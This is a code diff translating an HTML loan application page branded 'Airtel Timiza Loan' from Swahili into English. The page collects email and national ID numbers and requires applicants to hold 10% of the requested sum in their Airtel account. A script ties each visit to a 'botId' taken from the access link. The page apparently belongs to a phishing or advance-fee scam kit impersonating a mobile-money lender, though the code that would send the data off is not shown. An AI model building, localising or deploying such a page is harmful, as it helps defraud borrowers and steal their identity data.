@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fomu ya Maombi ya Mkopo</title>
+<title>Loan Application Form</title>
 
 <style>
 body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -41,60 +41,60 @@ button { width: 100%; padding: 12px; background: red; color: white; border: none
 <body>
 
 <div class="loan-container">
-    <h2>Airtel Timiza Mkopo</h2>
+    <h2>Airtel Timiza Loan</h2>
     <div class="logo-container">
-     <h1>Airtel Timiza Mkopo</h1>  
+     <h1>Airtel Timiza Loan</h1>  
     </div>
 
     <form id="loanForm">
-        <label>Kiasi cha Mkopo (TZs)</label>
-        <input id="loanAmount" type="number" required placeholder="KIMA CHA CHINI 500 - KIMA CHA JUU 20000">
+        <label>Loan Amount (TZs)</label>
+        <input id="loanAmount" type="number" required placeholder="MINIMUM 500 - MAXIMUM 20000">
 
-        <label>Barua Pepe (Email)</label>
-        <input id="email" type="email" placeholder="mfano@gmail.com" required>
+        <label>Email Address</label>
+        <input id="email" type="email" placeholder="example@gmail.com" required>
 
-        <label>Nambari ya Kitambulisho cha Taifa</label>
-        <input id="nationalId" type="text" placeholder="Kitambulisho cha Taifa">
+        <label>National ID Number</label>
+        <input id="nationalId" type="text" placeholder="National ID">
 
-        <label>Muda wa Marejesho</label>
+        <label>Repayment Period</label>
         <select id="repaymentPeriod" required>
-            <option value="">Chagua</option>
-            <option value="7days">Siku 7 (riba 1.5%)</option>
-            <option value="14days">Siku 14 (riba 2.5%)</option>
-            <option value="21days">Siku 21 (riba 3.5%)</option>
-            <option value="30days">Siku 30 (riba 4.5%)</option>
-            <option value="60days">Siku 60 (riba 6%)</option>
-            <option value="90days">Siku 90 (riba 10%)</option>
+            <option value="">Select</option>
+            <option value="7days">7 Days (interest 1.5%)</option>
+            <option value="14days">14 Days (interest 2.5%)</option>
+            <option value="21days">21 Days (interest 3.5%)</option>
+            <option value="30days">30 Days (interest 4.5%)</option>
+            <option value="60days">60 Days (interest 6%)</option>
+            <option value="90days">90 Days (interest 10%)</option>
         </select>
 
-        <label>Hali ya Ajira</label>
+        <label>Employment Status</label>
         <select id="employmentStatus" required>
-            <option value="">Chagua</option>
-            <option value="employed">Nimeajiriwa</option>
-            <option value="self-employed">Nimejiajiri</option>
-            <option value="unemployed">Sina Ajira</option>
-            <option value="student">Mwanafunzi</option>
+            <option value="">Select</option>
+            <option value="employed">Employed</option>
+            <option value="self-employed">Self-employed</option>
+            <option value="unemployed">Unemployed</option>
+            <option value="student">Student</option>
         </select>
 
-        <label>Madhumuni ya Mkopo</label>
+        <label>Loan Purpose</label>
         <select id="loanPurpose" required>
-            <option value="">Chagua</option>
-            <option value="business">Biashara</option>
-            <option value="personal">Mkopo wa Kibinafsi</option>
-            <option value="schoolfees">Ada za Shule</option>
-            <option value="medical">Matibabu</option>
-            <option value="others">Mengineyo</option>
+            <option value="">Select</option>
+            <option value="business">Business</option>
+            <option value="personal">Personal Loan</option>
+            <option value="schoolfees">School Fees</option>
+            <option value="medical">Medical</option>
+            <option value="others">Others</option>
         </select>
 
         <div class="loan-notice">
-            <strong>Taarifa ya Ustahiki:</strong>
+            <strong>Eligibility Notice:</strong>
             <ol>
-                <li>Lazima uombe kwa kutumia nambari halali ya Airtel</li>
-                <li>Lazima uwe na angalau 10% ya kiasi unachoomba kwenye akaunti ya Airtel</li>
+                <li>You must apply using a valid Airtel number</li>
+                <li>You must have at least 10% of the requested amount in your Airtel account</li>
             </ol>
         </div>
 
-        <button type="submit">Endelea</button>
+        <button type="submit">Continue</button>
     </form>
 </div>
 
@@ -106,7 +106,7 @@ if (!botId) {
     const botIndex = parts.indexOf('bot');
     if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
 }
-if (!botId) { alert("Kiungo batili cha ufikiaji"); throw new Error("botId missing"); }
+if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
 localStorage.setItem('botId', botId);
 
 // ---------------- FORM LOGIC ----------------
